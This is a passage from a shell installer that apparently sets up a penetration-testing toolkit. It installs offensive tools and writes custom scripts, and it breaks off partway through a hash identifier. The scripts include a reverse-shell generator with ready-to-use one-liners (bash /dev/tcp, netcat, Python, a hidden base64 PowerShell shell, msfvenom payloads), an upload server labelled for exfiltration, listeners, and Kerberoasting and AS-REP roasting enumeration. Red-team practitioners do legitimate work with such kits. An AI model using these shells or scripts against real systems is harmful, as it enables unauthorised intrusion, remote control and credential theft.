    if [ -d "${TOOLS_DIR}/routersploit" ] && [ "${DRY_RUN}" = false ]; then
        pip_venv_install "iot" \
            -r "${TOOLS_DIR}/routersploit/requirements.txt" 2>/dev/null || true
    fi

    # IoT protocol tools
    apt_install \
        mosquitto-clients

    # MQTT testing
    pip_venv_install "iot" \
        paho-mqtt

    log INFO "IoT hacking tools installed"
}

# ── Module: Pivoting & Tunneling ──────────────────────────────────────────

install_pivoting() {
    section "Pivoting & Tunneling Tools"

    # APT packages
    apt_install \
        proxychains4 socat \
        sshuttle autossh \
        openvpn wireguard-tools

    # Chisel
    go_install "github.com/jpillora/chisel@latest"

    # Ligolo-ng
    if [ ! -d "${TOOLS_DIR}/ligolo-ng" ]; then
        git_install "https://github.com/nicocha30/ligolo-ng" "${TOOLS_DIR}/ligolo-ng"
        if [ -d "${TOOLS_DIR}/ligolo-ng" ] && [ "${DRY_RUN}" = false ]; then
            log TASK "Building Ligolo-ng proxy and agent..."
            (cd "${TOOLS_DIR}/ligolo-ng" && \
                go build -o proxy cmd/proxy/main.go && \
                GOOS=windows GOARCH=amd64 go build -o agent.exe cmd/agent/main.go && \
                GOOS=linux GOARCH=amd64 go build -o agent cmd/agent/main.go \
            ) >> "${LOG_FILE}" 2>&1 || log WARN "Ligolo-ng build failed"
        fi
    fi

    # rpivot
    git_install "https://github.com/klsecservices/rpivot" \
        "${TOOLS_DIR}/rpivot"

    # dnscat2
    git_install "https://github.com/iagox86/dnscat2" \
        "${TOOLS_DIR}/dnscat2"

    log INFO "Pivoting tools installed"
}

# ── Module: Password & Credential Tools ──────────────────────────────────

install_password() {
    section "Password & Credential Tools"

    # APT packages
    apt_install \
        hashcat john hydra medusa \
        crunch cewl

    # Password tools
    git_install "https://github.com/ihebski/DefaultCreds-cheat-sheet" \
        "${TOOLS_DIR}/DefaultCreds-cheat-sheet"
    git_install "https://github.com/dafthack/MSOLSpray" \
        "${TOOLS_DIR}/MSOLSpray"
    git_install "https://github.com/hoto/jenkins-credentials-decryptor" \
        "${TOOLS_DIR}/jenkins-credentials-decryptor"

    # CUPP (Common User Passwords Profiler)
    git_install "https://github.com/Mebus/cupp" \
        "${TOOLS_DIR}/cupp"

    # Hashcat rules
    local rules_dir="${TOOLS_DIR}/hashcat-rules"
    if [ ! -d "${rules_dir}" ]; then
        mkdir -p "${rules_dir}"
        git_install "https://github.com/NotSoSecure/password_cracking_rules" \
            "${rules_dir}/NotSoSecure"
        git_install "https://github.com/stealthsploit/OneRuleToRuleThemStill" \
            "${rules_dir}/OneRuleToRuleThemStill"
    fi

    log INFO "Password tools installed"
}

# ── Module: Cloud Attack Tools ────────────────────────────────────────────

install_cloud() {
    section "Cloud Attack Tools (AWS / Azure / GCP)"

    # AWS tools
    if ! command -v aws &>/dev/null; then
        log TASK "Installing AWS CLI..."
        if [ "${DRY_RUN}" = false ]; then
            curl -sLo /tmp/awscli.zip \
                "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip"
            unzip -qo /tmp/awscli.zip -d /tmp/awscli
            /tmp/awscli/aws/install --update >> "${LOG_FILE}" 2>&1 || true
            rm -rf /tmp/awscli /tmp/awscli.zip
        fi
    fi

    # Azure CLI
    if ! command -v az &>/dev/null; then
        log TASK "Installing Azure CLI..."
        if [ "${DRY_RUN}" = false ]; then
            curl -sL https://aka.ms/InstallAzureCLIDeb | bash >> "${LOG_FILE}" 2>&1 || \
                log WARN "Azure CLI install failed"
        fi
    fi

    # GCP CLI
    if ! command -v gcloud &>/dev/null; then
        apt_install google-cloud-cli || \
            log WARN "gcloud CLI not available in repos — install manually"
    fi

    # Cloud attack tools
    pip_venv_install "cloud" \
        prowler checkov pacu \
        ScoutSuite

    pipx_install "enumerate-iam"
    pipx_install "principalmapper"

    # Azure AD tools
    git_install "https://github.com/f-bader/TokenTacticsV2" \
        "${TOOLS_DIR}/TokenTacticsV2"
    git_install "https://github.com/dirkjanm/ROADtools" \
        "${TOOLS_DIR}/ROADtools"
    git_install "https://github.com/NetSPI/MicroBurst" \
        "${TOOLS_DIR}/MicroBurst"

    # AWS tools
    git_install "https://github.com/RhinoSecurityLabs/pacu" \
        "${TOOLS_DIR}/pacu"

    # Terraform / IaC security
    pip_venv_install "cloud" \
        checkov

    log INFO "Cloud attack tools installed"
}

# ── Module: Mobile Security ───────────────────────────────────────────────

install_mobile() {
    section "Mobile Security Tools"

    # APT packages
    apt_install \
        apktool dex2jar adb fastboot jadx

    # Frida
    pip_venv_install "mobile" \
        frida-tools objection

    # MobSF (Docker)
    if command -v docker &>/dev/null; then
        log TASK "Pulling MobSF Docker image..."
        cmd docker pull opensecurity/mobile-security-framework-mobsf:latest || \
            log WARN "MobSF pull failed"
    fi

    # iOS tools
    git_install "https://github.com/AloneMonkey/frida-ios-dump" \
        "${TOOLS_DIR}/frida-ios-dump"

    log INFO "Mobile security tools installed"
}

# ── Module: Network Attack Tools ─────────────────────────────────────────

install_network() {
    section "Network Attack Tools"

    # APT packages
    apt_install \
        arpwatch arping ettercap-common ettercap-text-only \
        yersinia fping hping3 \
        nbtscan onesixtyone snmpwalk

    # Responder (if not in AD module)
    if [ ! -d "${TOOLS_DIR}/Responder" ]; then
        git_install "https://github.com/lgandx/Responder" \
            "${TOOLS_DIR}/Responder"
    fi

    # mitm6
    if ! command -v mitm6 &>/dev/null; then
        pipx_install "mitm6"
    fi

    # Bettercap (if not from wireless)
    if ! command -v bettercap &>/dev/null; then
        apt_install bettercap
    fi

    log INFO "Network attack tools installed"
}

# ── Module: AI Red Team ──────────────────────────────────────────────────

install_ai() {
    section "AI Red Team & LLM Security Tools"

    pip_venv_install "ai-redteam" \
        openai anthropic langchain \
        huggingface-hub transformers \
        garak \
        chromadb faiss-cpu

    # smolagents
    pip_venv_install "ai-redteam" \
        smolagents

    log INFO "AI red team tools installed"
}

# ── Module: Development Tools ────────────────────────────────────────────

install_dev_tools() {
    section "Development & Compilation Tools"

    # APT packages (many already in core, these are extras)
    apt_install \
        gcc-multilib g++-multilib \
        libelf-dev linux-headers-generic \
        strace ltrace \
        gdbserver \
        valgrind

    # Python offensive development libraries
    pip_venv_install "dev" \
        pycryptodome cryptography \
        paramiko requests httpx \
        scapy dnspython ldap3 \
        flask rich tenacity \
        selenium playwright

    # Playwright browsers
    if [ "${DRY_RUN}" = false ]; then
        "${VENV_DIR}/dev/bin/playwright" install --with-deps chromium \
            >> "${LOG_FILE}" 2>&1 || log WARN "Playwright browser install failed"
    fi

    log INFO "Development tools installed"
}

# ── Module: Wordlists & Resources ────────────────────────────────────────

install_wordlists() {
    section "Wordlists & Payload Collections"

    # SecLists
    if [ ! -d "${WORDLIST_DIR}/SecLists" ]; then
        log TASK "Cloning SecLists (this may take a while)..."
        git_install "https://github.com/danielmiessler/SecLists" \
            "${WORDLIST_DIR}/SecLists"
    fi

    # OneListForAll
    git_install "https://github.com/six2dez/OneListForAll" \
        "${WORDLIST_DIR}/OneListForAll"

    # FuzzDB
    git_install "https://github.com/fuzzdb-project/fuzzdb" \
        "${WORDLIST_DIR}/fuzzdb"

    # Assetnote wordlists (smaller curated sets)
    git_install "https://github.com/assetnote/commonspeak2-wordlists" \
        "${WORDLIST_DIR}/commonspeak2"

    # Rockyou (usually bundled with Kali)
    if [ -f /usr/share/wordlists/rockyou.txt.gz ] && \
       [ ! -f /usr/share/wordlists/rockyou.txt ]; then
        log TASK "Extracting rockyou.txt..."
        cmd gunzip -k /usr/share/wordlists/rockyou.txt.gz || true
    fi

    # Create symlink for easy access
    if [ ! -L "${WORDLIST_DIR}/rockyou.txt" ]; then
        ln -sf /usr/share/wordlists/rockyou.txt "${WORDLIST_DIR}/rockyou.txt" 2>/dev/null || true
    fi

    log INFO "Wordlists installed at ${WORDLIST_DIR}"
}

# ── Module: Custom Tools ─────────────────────────────────────────────────

install_custom_tools() {
    section "Custom Red Team Tools"

    # ── 1. Quick Port Scanner with Service Detection ──
    cat > "${CUSTOM_TOOLS_DIR}/quick-scan.py" << 'PYSCAN'
#!/usr/bin/env python3
"""Quick async port scanner with service banner grabbing.
Usage: quick-scan.py <target> [--ports 1-1024] [--threads 100]
"""
import argparse
import asyncio
import socket
import sys
from concurrent.futures import ThreadPoolExecutor

COMMON_PORTS = {
    21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
    80: "HTTP", 110: "POP3", 111: "RPCbind", 135: "MSRPC",
    139: "NetBIOS", 143: "IMAP", 443: "HTTPS", 445: "SMB",
    993: "IMAPS", 995: "POP3S", 1433: "MSSQL", 1521: "Oracle",
    3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL", 5900: "VNC",
    6379: "Redis", 8080: "HTTP-Alt", 8443: "HTTPS-Alt",
    8888: "HTTP-Alt", 9200: "Elasticsearch", 27017: "MongoDB",
}

def grab_banner(host, port, timeout=2):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            s.connect((host, port))
            s.send(b"HEAD / HTTP/1.0\r\n\r\n")
            return s.recv(256).decode(errors="replace").strip()[:80]
    except Exception:
        return ""

def scan_port(host, port, timeout=1.5):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            result = s.connect_ex((host, port))
            if result == 0:
                service = COMMON_PORTS.get(port, "unknown")
                banner = grab_banner(host, port)
                return (port, service, banner)
    except Exception:
        pass
    return None

async def main():
    parser = argparse.ArgumentParser(description="Quick port scanner")
    parser.add_argument("target", help="Target IP or hostname")
    parser.add_argument("--ports", default="1-1024", help="Port range (default: 1-1024)")
    parser.add_argument("--threads", type=int, default=200, help="Thread count")
    args = parser.parse_args()

    start, end = map(int, args.ports.split("-"))
    ports = range(start, end + 1)

    print(f"\n[*] Scanning {args.target} ports {start}-{end} ({len(ports)} ports)")
    print(f"[*] Threads: {args.threads}\n")

    results = []
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = {executor.submit(scan_port, args.target, p): p for p in ports}
        for future in futures:
            result = future.result()
            if result:
                results.append(result)

    results.sort(key=lambda x: x[0])
    if results:
        print(f"{'PORT':<8} {'SERVICE':<15} {'BANNER'}")
        print("-" * 60)
        for port, service, banner in results:
            print(f"{port:<8} {service:<15} {banner}")
        print(f"\n[+] {len(results)} open port(s) found")
    else:
        print("[-] No open ports found")

if __name__ == "__main__":
    asyncio.run(main())
PYSCAN
    chmod +x "${CUSTOM_TOOLS_DIR}/quick-scan.py"

    # ── 2. Subdomain Aggregator ──
    cat > "${CUSTOM_TOOLS_DIR}/subdomain-aggregator.sh" << 'SUBENUM'
#!/usr/bin/env bash
# Aggregate subdomains from multiple sources and deduplicate.
# Usage: subdomain-aggregator.sh <domain> [output_file]
set -euo pipefail

DOMAIN="${1:?Usage: subdomain-aggregator.sh <domain> [output_file]}"
OUTPUT="${2:-${DOMAIN}-subs.txt}"
TEMP_DIR=$(mktemp -d)
trap 'rm -rf "${TEMP_DIR}"' EXIT

echo "[*] Aggregating subdomains for ${DOMAIN}"
echo ""

# Source 1: subfinder
if command -v subfinder &>/dev/null; then
    echo "[>] Running subfinder..."
    subfinder -d "${DOMAIN}" -silent -o "${TEMP_DIR}/subfinder.txt" 2>/dev/null || true
fi

# Source 2: amass (passive only for speed)
if command -v amass &>/dev/null; then
    echo "[>] Running amass (passive)..."
    timeout 120 amass enum -passive -d "${DOMAIN}" -o "${TEMP_DIR}/amass.txt" 2>/dev/null || true
fi

# Source 3: assetfinder
if command -v assetfinder &>/dev/null; then
    echo "[>] Running assetfinder..."
    assetfinder --subs-only "${DOMAIN}" > "${TEMP_DIR}/assetfinder.txt" 2>/dev/null || true
fi

# Source 4: crt.sh
echo "[>] Querying crt.sh..."
curl -s "https://crt.sh/?q=%25.${DOMAIN}&output=json" 2>/dev/null | \
    jq -r '.[].name_value' 2>/dev/null | \
    sed 's/\*\.//g' | sort -u > "${TEMP_DIR}/crtsh.txt" || true

# Source 5: waybackurls domains
if command -v waybackurls &>/dev/null; then
    echo "[>] Extracting from Wayback Machine..."
    echo "${DOMAIN}" | waybackurls 2>/dev/null | \
        unfurl -u domains 2>/dev/null | \
        grep -i "${DOMAIN}$" > "${TEMP_DIR}/wayback.txt" || true
fi

# Source 6: gau (Get All URLs)
if command -v gau &>/dev/null; then
    echo "[>] Running gau..."
    echo "${DOMAIN}" | gau --subs 2>/dev/null | \
        unfurl -u domains 2>/dev/null | \
        grep -i "${DOMAIN}$" > "${TEMP_DIR}/gau.txt" || true
fi

# Merge and deduplicate
echo ""
echo "[*] Merging results..."
cat "${TEMP_DIR}"/*.txt 2>/dev/null | \
    tr '[:upper:]' '[:lower:]' | \
    sort -u | \
    grep -E "\.${DOMAIN}$" > "${OUTPUT}"

TOTAL=$(wc -l < "${OUTPUT}")
echo "[+] Found ${TOTAL} unique subdomains → ${OUTPUT}"

# Count per source
for f in "${TEMP_DIR}"/*.txt; do
    src=$(basename "${f}" .txt)
    count=$(wc -l < "${f}" 2>/dev/null || echo 0)
    echo "    ${src}: ${count}"
done

# Probe live hosts if httpx is available
if command -v httpx &>/dev/null; then
    echo ""
    read -rp "[?] Probe for live hosts with httpx? [y/N] " probe
    if [[ "${probe}" =~ ^[Yy] ]]; then
        httpx -l "${OUTPUT}" -silent -o "${DOMAIN}-live.txt"
        echo "[+] Live hosts → ${DOMAIN}-live.txt"
    fi
fi
SUBENUM
    chmod +x "${CUSTOM_TOOLS_DIR}/subdomain-aggregator.sh"

    # ── 3. Reverse Shell Generator ──
    cat > "${CUSTOM_TOOLS_DIR}/revshell.py" << 'REVSHELL'
#!/usr/bin/env python3
"""Generate reverse shell one-liners for common languages.
Usage: revshell.py <LHOST> <LPORT> [--type bash|python|powershell|php|...]
       revshell.py <LHOST> <LPORT> --all
"""
import argparse
import base64
import sys
import urllib.parse

SHELLS = {
    "bash": 'bash -i >& /dev/tcp/{host}/{port} 0>&1',
    "bash-tcp": '/bin/bash -l > /dev/tcp/{host}/{port} 0<&1 2>&1',
    "sh": 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {host} {port} >/tmp/f',
    "nc": 'nc -e /bin/sh {host} {port}',
    "nc-mkfifo": 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {host} {port} >/tmp/f',
    "ncat": 'ncat {host} {port} -e /bin/bash',
    "python": 'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{host}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
    "python-pty": 'python3 -c \'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{host}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")\'',
    "perl": 'perl -e \'use Socket;$i="{host}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");}};\'',
    "php": 'php -r \'$sock=fsockopen("{host}",{port});exec("sh <&3 >&3 2>&3");\'',
    "ruby": 'ruby -rsocket -e\'f=TCPSocket.open("{host}",{port}).to_i;exec sprintf("sh -i <&%d >&%d 2>&%d",f,f,f)\'',
    "powershell": '$client = New-Object System.Net.Sockets.TCPClient("{host}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()',
    "powershell-b64": "__b64__",
    "lua": 'lua -e "require(\'socket\');require(\'os\');t=socket.tcp();t:connect(\'{host}\',\'{port}\');os.execute(\'sh -i <&3 >&3 2>&3\')"',
    "java": 'Runtime r = Runtime.getRuntime(); Process p = r.exec(new String[]{{"/bin/bash","-c","bash -i >& /dev/tcp/{host}/{port} 0>&1"}}); p.waitFor();',
    "xterm": 'xterm -display {host}:1',
    "socat": 'socat exec:\'bash -li\',pty,stderr,setsid,sigint,sane tcp:{host}:{port}',
    "awk": 'awk \'BEGIN {{s = "/inet/tcp/0/{host}/{port}"; while(42) {{ do {{ printf "shell>" |& s; s |& getline c; if(c) {{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != "exit") close(s); }}}}\'',
    "nodejs": '(function(){{var net = require("net"),cp = require("child_process"),sh = cp.spawn("sh", []);var client = new net.Socket();client.connect({port}, "{host}", function(){{client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);}});return /a/;}})();',
    "openssl": 'mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {host}:{port} > /tmp/s; rm /tmp/s',
    "msfvenom-linux": 'msfvenom -p linux/x64/shell_reverse_tcp LHOST={host} LPORT={port} -f elf -o rev.elf',
    "msfvenom-windows": 'msfvenom -p windows/x64/shell_reverse_tcp LHOST={host} LPORT={port} -f exe -o rev.exe',
    "msfvenom-web-jsp": 'msfvenom -p java/jsp_shell_reverse_tcp LHOST={host} LPORT={port} -f raw -o rev.jsp',
    "msfvenom-web-war": 'msfvenom -p java/jsp_shell_reverse_tcp LHOST={host} LPORT={port} -f war -o rev.war',
}

def main():
    parser = argparse.ArgumentParser(description="Reverse shell generator")
    parser.add_argument("host", help="Attacker IP (LHOST)")
    parser.add_argument("port", help="Attacker port (LPORT)")
    parser.add_argument("-t", "--type", default=None,
                        help=f"Shell type: {', '.join(SHELLS.keys())}")
    parser.add_argument("--all", action="store_true", help="Print all shell types")
    parser.add_argument("--list", action="store_true", help="List available types")
    args = parser.parse_args()

    if args.list:
        for name in sorted(SHELLS.keys()):
            print(f"  {name}")
        return

    if args.all:
        for name, template in SHELLS.items():
            shell = template.format(host=args.host, port=args.port)
            if name == "powershell-b64":
                ps_cmd = SHELLS["powershell"].format(host=args.host, port=args.port)
                b64 = base64.b64encode(ps_cmd.encode("utf-16le")).decode()
                shell = f"powershell -nop -w hidden -enc {b64}"
            print(f"\n{'='*60}")
            print(f"  [{name}]")
            print(f"{'='*60}")
            print(shell)
        return

    shell_type = args.type or "bash"
    if shell_type not in SHELLS:
        print(f"[-] Unknown type: {shell_type}")
        print(f"    Available: {', '.join(sorted(SHELLS.keys()))}")
        sys.exit(1)

    if shell_type == "powershell-b64":
        ps_cmd = SHELLS["powershell"].format(host=args.host, port=args.port)
        b64 = base64.b64encode(ps_cmd.encode("utf-16le")).decode()
        print(f"powershell -nop -w hidden -enc {b64}")
    else:
        print(SHELLS[shell_type].format(host=args.host, port=args.port))

if __name__ == "__main__":
    main()
REVSHELL
    chmod +x "${CUSTOM_TOOLS_DIR}/revshell.py"

    # ── 4. HTTP File Server (quick exfil/transfer) ──
    cat > "${CUSTOM_TOOLS_DIR}/serve.py" << 'HTTPSERVE'
#!/usr/bin/env python3
"""Quick HTTP file server with upload support.
Usage: serve.py [--port 8080] [--dir /path] [--upload]
"""
import argparse
import http.server
import os
import cgi
import sys

class UploadHandler(http.server.SimpleHTTPRequestHandler):
    """Handler that supports GET (download) and POST (upload)."""
    def do_POST(self):
        ctype, pdict = cgi.parse_header(self.headers.get('Content-Type', ''))
        if ctype != 'multipart/form-data':
            # Raw body upload — save to filename from URL path
            length = int(self.headers.get('Content-Length', 0))
            data = self.rfile.read(length)
            fname = os.path.basename(self.path.strip('/')) or 'upload'
            fpath = os.path.join(os.getcwd(), fname)
            with open(fpath, 'wb') as f:
                f.write(data)
            self.send_response(200)
            self.end_headers()
            self.wfile.write(f"Saved: {fpath}\n".encode())
            print(f"[+] Received upload: {fpath} ({len(data)} bytes)")
            return

        pdict['boundary'] = pdict['boundary'].encode()
        form = cgi.FieldStorage(
            fp=self.rfile, headers=self.headers,
            environ={'REQUEST_METHOD': 'POST'})
        field = form['file']
        fname = os.path.basename(field.filename)
        fpath = os.path.join(os.getcwd(), fname)
        with open(fpath, 'wb') as f:
            f.write(field.file.read())
        self.send_response(200)
        self.end_headers()
        self.wfile.write(f"Saved: {fpath}\n".encode())
        print(f"[+] Received upload: {fpath}")

def main():
    parser = argparse.ArgumentParser(description="HTTP file server with upload")
    parser.add_argument("-p", "--port", type=int, default=8080)
    parser.add_argument("-d", "--dir", default=".")
    parser.add_argument("--upload", action="store_true", help="Enable upload via POST")
    args = parser.parse_args()

    os.chdir(args.dir)
    handler = UploadHandler if args.upload else http.server.SimpleHTTPRequestHandler
    server = http.server.HTTPServer(("0.0.0.0", args.port), handler)

    ip = os.popen("hostname -I").read().strip().split()[0]
    print(f"[*] Serving {os.getcwd()} on http://{ip}:{args.port}")
    if args.upload:
        print(f"[*] Upload: curl -F 'file=@local.txt' http://{ip}:{args.port}/")
        print(f"[*] Upload: curl -X POST --data-binary @file.bin http://{ip}:{args.port}/file.bin")
    print("[*] Ctrl+C to stop\n")
    server.serve_forever()

if __name__ == "__main__":
    main()
HTTPSERVE
    chmod +x "${CUSTOM_TOOLS_DIR}/serve.py"

    # ── 5. AD Quick Enum Script ──
    cat > "${CUSTOM_TOOLS_DIR}/ad-quick-enum.sh" << 'ADENUM'
#!/usr/bin/env bash
# Quick AD enumeration wrapper.
# Usage: ad-quick-enum.sh <DC_IP> <DOMAIN> <USERNAME> <PASSWORD>
set -euo pipefail

DC="${1:?Usage: ad-quick-enum.sh <DC_IP> <DOMAIN> <USER> <PASS>}"
DOMAIN="${2:?}"
USER="${3:?}"
PASS="${4:?}"
OUT_DIR="./ad-enum-$(date +%Y%m%d-%H%M%S)"
mkdir -p "${OUT_DIR}"

echo "[*] AD Quick Enumeration"
echo "[*] Target: ${DC} (${DOMAIN})"
echo "[*] Output: ${OUT_DIR}"
echo ""

# 1. Domain users
echo "[>] Enumerating domain users..."
netexec smb "${DC}" -u "${USER}" -p "${PASS}" --users \
    > "${OUT_DIR}/users.txt" 2>/dev/null || true

# 2. Domain groups
echo "[>] Enumerating domain groups..."
netexec smb "${DC}" -u "${USER}" -p "${PASS}" --groups \
    > "${OUT_DIR}/groups.txt" 2>/dev/null || true

# 3. SMB shares
echo "[>] Enumerating SMB shares..."
netexec smb "${DC}" -u "${USER}" -p "${PASS}" --shares \
    > "${OUT_DIR}/shares.txt" 2>/dev/null || true

# 4. Password policy
echo "[>] Getting password policy..."
netexec smb "${DC}" -u "${USER}" -p "${PASS}" --pass-pol \
    > "${OUT_DIR}/pass-policy.txt" 2>/dev/null || true

# 5. Kerberoastable accounts
echo "[>] Finding Kerberoastable accounts..."
impacket-GetUserSPNs "${DOMAIN}/${USER}:${PASS}" -dc-ip "${DC}" \
    -outputfile "${OUT_DIR}/kerberoast-hashes.txt" 2>/dev/null || true

# 6. AS-REP roastable accounts
echo "[>] Finding AS-REP roastable accounts..."
impacket-GetNPUsers "${DOMAIN}/" -dc-ip "${DC}" -usersfile "${OUT_DIR}/users.txt" \
    -format hashcat -outputfile "${OUT_DIR}/asrep-hashes.txt" 2>/dev/null || true

# 7. LDAP enumeration
echo "[>] LDAP domain info..."
ldapsearch -x -H "ldap://${DC}" -D "${USER}@${DOMAIN}" -w "${PASS}" \
    -b "DC=$(echo ${DOMAIN} | sed 's/\./,DC=/g')" \
    "(objectClass=domain)" 2>/dev/null | head -50 > "${OUT_DIR}/ldap-info.txt" || true

# 8. BloodHound collection (if available)
if command -v bloodhound-python &>/dev/null; then
    echo "[>] Running BloodHound collector..."
    bloodhound-python -d "${DOMAIN}" -u "${USER}" -p "${PASS}" \
        -dc "${DC}" -c All --zip -o "${OUT_DIR}/bloodhound/" 2>/dev/null || true
fi

echo ""
echo "[+] Enumeration complete. Results in ${OUT_DIR}/"
ls -la "${OUT_DIR}/"
ADENUM
    chmod +x "${CUSTOM_TOOLS_DIR}/ad-quick-enum.sh"

    # ── 6. Web Recon Automation ──
    cat > "${CUSTOM_TOOLS_DIR}/web-recon.sh" << 'WEBRECON'
#!/usr/bin/env bash
# Automated web reconnaissance pipeline.
# Usage: web-recon.sh <target_url>
set -euo pipefail

TARGET="${1:?Usage: web-recon.sh <target_url>}"
DOMAIN=$(echo "${TARGET}" | sed 's|https\?://||' | sed 's|/.*||')
OUT_DIR="./web-recon-${DOMAIN}-$(date +%Y%m%d-%H%M%S)"
mkdir -p "${OUT_DIR}"

echo "[*] Web Reconnaissance Pipeline"
echo "[*] Target: ${TARGET}"
echo "[*] Output: ${OUT_DIR}"
echo ""

# 1. Technology fingerprint
echo "[>] Technology fingerprint..."
if command -v whatweb &>/dev/null; then
    whatweb -a 3 "${TARGET}" > "${OUT_DIR}/whatweb.txt" 2>/dev/null || true
fi

# 2. HTTP headers
echo "[>] HTTP headers..."
curl -sI -L "${TARGET}" > "${OUT_DIR}/headers.txt" 2>/dev/null || true

# 3. SSL/TLS info
if echo "${TARGET}" | grep -q "https"; then
    echo "[>] SSL/TLS analysis..."
    echo | openssl s_client -connect "${DOMAIN}:443" -servername "${DOMAIN}" 2>/dev/null | \
        openssl x509 -noout -text > "${OUT_DIR}/ssl-cert.txt" 2>/dev/null || true
fi

# 4. Directory brute force
echo "[>] Directory discovery (ffuf)..."
if command -v ffuf &>/dev/null; then
    ffuf -u "${TARGET}/FUZZ" \
        -w /opt/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt \
        -mc 200,301,302,403 -t 50 -o "${OUT_DIR}/ffuf-dirs.json" \
        -of json 2>/dev/null || true
fi

# 5. Crawling
echo "[>] Crawling with katana..."
if command -v katana &>/dev/null; then
    katana -u "${TARGET}" -d 3 -jc -o "${OUT_DIR}/katana-urls.txt" 2>/dev/null || true
fi

# 6. JavaScript endpoints
echo "[>] Extracting JS endpoints..."
if [ -d /opt/red-team/LinkFinder ]; then
    python3 /opt/red-team/LinkFinder/linkfinder.py -i "${TARGET}" \
        -o "${OUT_DIR}/js-endpoints.html" 2>/dev/null || true
fi

# 7. Vulnerability scan
echo "[>] Nuclei scan (top templates)..."
if command -v nuclei &>/dev/null; then
    nuclei -u "${TARGET}" -severity critical,high,medium \
        -o "${OUT_DIR}/nuclei-results.txt" 2>/dev/null || true
fi

# 8. WAF detection
echo "[>] WAF detection..."
if command -v wafw00f &>/dev/null; then
    wafw00f "${TARGET}" > "${OUT_DIR}/waf.txt" 2>/dev/null || true
fi

echo ""
echo "[+] Web recon complete. Results in ${OUT_DIR}/"
ls -la "${OUT_DIR}/"
WEBRECON
    chmod +x "${CUSTOM_TOOLS_DIR}/web-recon.sh"

    # ── 7. Listener Setup Script ──
    cat > "${CUSTOM_TOOLS_DIR}/listener.sh" << 'LISTENER'
#!/usr/bin/env bash
# Quick listener setup with multiple options.
# Usage: listener.sh <port> [--type nc|socat|msfmulti|pwncat]
set -euo pipefail

PORT="${1:?Usage: listener.sh <port> [--type nc|socat|msfmulti|pwncat]}"
TYPE="${3:-nc}"
IP=$(hostname -I | awk '{print $1}')

echo "[*] Starting ${TYPE} listener on ${IP}:${PORT}"
echo ""

case "${TYPE}" in
    nc)
        echo "[*] Netcat listener (Ctrl+C to stop)"
        nc -nlvp "${PORT}"
        ;;
    socat)
        echo "[*] Socat TTY listener (Ctrl+C to stop)"
        echo "[*] On target run: socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${IP}:${PORT}"
        socat file:"$(tty)",raw,echo=0 tcp-listen:"${PORT}"
        ;;
    msfmulti)
        echo "[*] Metasploit multi/handler"
        msfconsole -q -x "use exploit/multi/handler; set PAYLOAD generic/shell_reverse_tcp; set LHOST ${IP}; set LPORT ${PORT}; run"
        ;;
    pwncat)
        if command -v pwncat-cs &>/dev/null; then
            echo "[*] pwncat listener"
            pwncat-cs -lp "${PORT}"
        else
            echo "[-] pwncat not installed. Install: pipx install pwncat-cs"
            exit 1
        fi
        ;;
    *)
        echo "[-] Unknown type: ${TYPE}"
        echo "    Available: nc, socat, msfmulti, pwncat"
        exit 1
        ;;
esac
LISTENER
    chmod +x "${CUSTOM_TOOLS_DIR}/listener.sh"

    # ── 8. Hash Identifier ──
    cat > "${CUSTOM_TOOLS_DIR}/hash-id.py" << 'HASHID'
#!/usr/bin/env python3
"""Identify hash types and suggest hashcat/john modes.
Usage: hash-id.py <hash>
       echo 'hash' | hash-id.py
"""
import re
import sys

HASH_PATTERNS = [
    (r'^[a-f0-9]{32}$', 'MD5', '0', 'raw-md5'),
    (r'^[a-f0-9]{40}$', 'SHA-1', '100', 'raw-sha1'),
    (r'^[a-f0-9]{64}$', 'SHA-256', '1400', 'raw-sha256'),
    (r'^[a-f0-9]{128}$', 'SHA-512', '1700', 'raw-sha512'),
    (r'^[a-f0-9]{32}:[a-f0-9]+$', 'MD5 (salted)', '10', 'md5crypt'),
    (r'^\$1\$', 'MD5crypt (Unix)', '500', 'md5crypt'),
    (r'^\$2[aby]?\$\d+\$', 'bcrypt', '3200', 'bcrypt'),
    (r'^\$5\$', 'SHA-256crypt (Unix)', '7400', 'sha256crypt'),
    (r'^\$6\$', 'SHA-512crypt (Unix)', '1800', 'sha512crypt'),
    (r'^\$apr1\$', 'Apache APR1', '1600', 'apr1-md5'),
    (r'^\$y\$', 'yescrypt', '', 'yescrypt'),
    (r'^[a-f0-9]{32}:[a-f0-9]{32}$', 'NTLM (with LM)', '1000', 'nt'),
    (r'^[a-f0-9]{32}$', 'NTLM', '1000', 'nt'),
